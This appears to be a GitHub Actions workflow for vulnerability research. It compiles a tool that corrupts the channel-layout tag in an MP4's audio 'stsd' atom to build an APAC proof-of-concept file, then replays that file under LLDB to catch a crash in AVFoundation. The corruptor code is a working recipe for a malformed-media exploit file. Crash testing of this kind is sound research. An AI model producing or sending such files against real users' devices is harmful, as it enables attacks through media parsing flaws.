name: Targeted APAC File Corruption and Fuzzing
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-and-test:
    runs-on: macos-latest

    steps:
      # Clone your repository
      - name: Clone Your Repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # Create our Swift player harness
      - name: Create Swift Player Harness
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating Swift audio player harness..."
          cat > harness.swift << 'EOF'
          import Foundation
          import AVFoundation

          class PlayerDelegate: NSObject, AVAudioPlayerDelegate {
              var isPlaying = true
              func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
                  // Suppress output on success to keep logs clean
                  isPlaying = false
              }
              func audioPlayerDecodeErrorDidOccur(_ player: AVAudioPlayer, error: Error?) {
                  print("Harness Decode Error: \(error?.localizedDescription ?? "unknown error")")
                  isPlaying = false
              }
          }

          if CommandLine.arguments.count < 2 {
              exit(1)
          }

          let filePath = CommandLine.arguments[1]
          let fileURL = URL(fileURLWithPath: filePath)

          do {
              let delegate = PlayerDelegate()
              let audioPlayer = try AVAudioPlayer(contentsOf: fileURL)
              audioPlayer.delegate = delegate
              audioPlayer.play()
              
              while delegate.isPlaying {
                  RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1))
              }
          } catch {
              print("Harness failed to initialize AVAudioPlayer: \(error.localizedDescription)")
          }
          EOF

      # This script is now an intelligent, self-contained parser and corruptor.
      - name: Create C++ Parser and Corruptor
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating intelligent Objective-C++ file parser and corruption utility..."
          cat > corruptor.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #include <stdio.h>
          #include <string.h>
          #include <sys/types.h>

          // Helper to read a 32-bit big-endian integer
          uint32_t read_uint32_be(FILE *f) {
              unsigned char bytes[4];
              if (fread(bytes, 1, 4, f) != 4) return 0;
              return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
          }

          // Helper to compare four-character atom names
          bool compare_fourcc(const char* a, const char* b) {
              return strncmp(a, b, 4) == 0;
          }
          
          // Function to find the offset of a direct child atom within a parent container
          long find_child_atom(FILE* f, const char* target_name, long parent_end_offset) {
              long current_pos = ftell(f);
              while (current_pos < parent_end_offset) {
                  fseek(f, current_pos, SEEK_SET);
                  long atom_start = ftell(f);
                  uint32_t atom_size = read_uint32_be(f);
                  if (atom_size == 0) return -1;
                  char atom_name[5] = {0};
                  if (fread(atom_name, 1, 4, f) != 4) return -1;

                  if (compare_fourcc(atom_name, target_name)) {
                      return atom_start;
                  }
                  current_pos = atom_start + atom_size;
              }
              return -1;
          }

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  const char* baseName = "IMG_1047.mov";
                  const char* pocName = "output_apac_poc.mp4";

                  if (![[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:baseName] toPath:[NSString stringWithUTF8String:pocName] error:nil]) {
                      fprintf(stderr, "Failed to copy base file.\n"); return 1;
                  }
                  fprintf(stderr, "Successfully copied base file.\n");

                  FILE *file = fopen(pocName, "r+b");
                  if (!file) {
                      fprintf(stderr, "Failed to re-open file for corruption.\n"); return 1;
                  }
                  
                  // Find the 'moov' atom
                  fseek(file, 0, SEEK_END);
                  long file_size = ftell(file);
                  fseek(file, 0, SEEK_SET);
                  long moov_offset = find_child_atom(file, "moov", file_size);
                  if (moov_offset == -1) { fprintf(stderr, "Could not find 'moov' atom.\n"); fclose(file); return 1; }

                  fseek(file, moov_offset, SEEK_SET);
                  uint32_t moov_size = read_uint32_be(file);
                  
                  // Iterate through tracks inside 'moov'
                  long trak_search_start = moov_offset + 8;
                  long stsd_offset = -1;
                  while(trak_search_start < moov_offset + moov_size) {
                      fseek(file, trak_search_start, SEEK_SET);
                      long trak_offset = find_child_atom(file, "trak", moov_offset + moov_size);
                      if (trak_offset == -1) break;

                      fseek(file, trak_offset, SEEK_SET);
                      uint32_t trak_size = read_uint32_be(file);
                      
                      fseek(file, trak_offset + 8, SEEK_SET);
                      long mdia_offset = find_child_atom(file, "mdia", trak_offset + trak_size);
                      if (mdia_offset == -1) { trak_search_start = trak_offset + trak_size; continue; }
                      
                      fseek(file, mdia_offset, SEEK_SET);
                      uint32_t mdia_size = read_uint32_be(file);
                      
                      fseek(file, mdia_offset + 8, SEEK_SET);
                      long hdlr_offset = find_child_atom(file, "hdlr", mdia_offset + mdia_size);
                      if (hdlr_offset == -1) { trak_search_start = trak_offset + trak_size; continue; }

                      fseek(file, hdlr_offset + 16, SEEK_SET);
                      char handler_type[5] = {0};
                      fread(handler_type, 1, 4, file);

                      if (compare_fourcc(handler_type, "soun")) {
                          // This is the audio track. Find its stsd.
                          fseek(file, mdia_offset + 8, SEEK_SET);
                          long minf_offset = find_child_atom(file, "minf", mdia_offset + mdia_size);
                          fseek(file, minf_offset, SEEK_SET);
                          uint32_t minf_size = read_uint32_be(file);

                          fseek(file, minf_offset + 8, SEEK_SET);
                          long stbl_offset = find_child_atom(file, "stbl", minf_offset + minf_size);
                          fseek(file, stbl_offset, SEEK_SET);
                          uint32_t stbl_size = read_uint32_be(file);

                          fseek(file, stbl_offset + 8, SEEK_SET);
                          stsd_offset = find_child_atom(file, "stsd", stbl_offset + stbl_size);
                          break; // Found it
                      }
                      trak_search_start = trak_offset + trak_size;
                  }

                  if (stsd_offset == -1) {
                      fprintf(stderr, "Could not find the audio track's 'stsd' atom.\n");
                      fclose(file); return 1;
                  }
                  
                  fprintf(stderr, "Found audio 'stsd' atom at offset: 0x%lx\n", stsd_offset);

                  // Corrupt the channel layout tag. The offset is relative to the start of the stsd atom.
                  long corruption_offset = stsd_offset + 72;
                  fseek(file, corruption_offset, SEEK_SET);
                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
                  
                  fclose(file);
                  fprintf(stderr, "Corruption complete.\n");
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile the C++ utility
      - name: Compile Custom Tools
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling Swift harness..."
          swiftc harness.swift -o harness
          if [ ! -f ./harness ]; then echo "Swift harness compilation failed."; exit 1; fi
          echo "Compiling C++ corruptor..."
          clang++ -g corruptor.mm -o corruptor -framework Foundation
          if [ ! -f ./corruptor ]; then echo "C++ corruptor compilation failed."; exit 1; fi

      # Run the new C++ utility to parse and corrupt the file.
      - name: Surgically Corrupt APAC File
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          ./corruptor
          echo "Malicious APAC PoC file generated."
          ls -l output_apac_poc.mp4
          
      # Launch our custom player under LLDB to catch any crash.
      - name: Launch Player Under LLDB to Catch Crash
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Custom Player with final PoC ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor the harness..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will automatically stop if a crash occurs.
          run
          # If a crash occurred, this will give us the full backtrace.
          bt
          quit
          EOF

          echo "Launching custom Swift harness under LLDB..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.mp4 >> $PLAYER_LOG_FILE 2>&1 || true

          echo "✅ Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts for analysis
      - name: Upload All Artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: debug-and-poc-artifacts
          path: |
            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
